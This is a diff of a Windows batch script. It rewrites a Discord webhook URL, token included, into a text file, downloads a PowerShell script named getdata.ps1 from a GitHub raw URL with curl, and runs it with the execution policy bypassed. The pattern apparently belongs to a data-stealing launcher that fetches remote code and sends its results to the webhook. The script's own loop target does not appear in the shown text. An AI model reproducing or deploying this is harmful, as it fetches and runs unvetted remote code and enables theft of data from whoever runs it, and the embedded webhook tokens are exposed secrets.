@@ -1,5 +1,5 @@
 @echo off
-echo https://discord.com/api/webhooks/1508108734189273118/n1qzWZmXsbf0B6h9H7M2lvWZ_fSsqHo0fDTto6fabx6g2nVcn8E7cHcoIdLSEmsLM-ur>discord_webhook.txt
+echo https://discord.com/api/webhooks/1508235078134661291/Cr5gnipBCd1EuD9tpZEsM5zzI-_Tioot9toD7sFaMDw_XH8D9_jlloOSGFIWXyI-KNpZ>discord_webhook.txt
 curl -L https://raw.githubusercontent.com/thompog/bob/refs/heads/main/getdata.ps1 -o getdata.ps1
 powershell -ExecutionPolicy Bypass -File "%~dp0getdata.ps1"
 goto loop
